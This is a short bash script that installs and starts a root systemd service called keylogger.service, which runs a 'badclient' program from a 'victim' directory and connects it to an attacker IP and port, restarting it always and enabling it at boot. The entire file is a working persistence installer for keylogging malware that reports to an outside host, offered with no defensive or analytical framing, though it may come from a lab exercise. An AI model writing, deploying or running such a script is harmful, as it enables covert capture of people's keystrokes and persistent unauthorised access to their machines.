#!/bin/bash

PROJECT_DIR="/home/badguy/victim"

ATTACKER_IP="192.168.99.10"
ATTACKER_PORT=8080

# One time install - create and enable service if missing
if [ ! -f /etc/systemd/system/keylogger.service ]; then
    sudo bash -c "cat > /etc/systemd/system/keylogger.service <<EOF
[Unit]
Description=Keylogger client + kernel module
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$PROJECT_DIR
ExecStart=$PROJECT_DIR/badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF"

    sudo systemctl daemon-reload
    sudo systemctl enable keylogger.service
fi

# Start the service (systemd will run badclient)
sudo systemctl start keylogger.service

echo "[+] keylogger service started"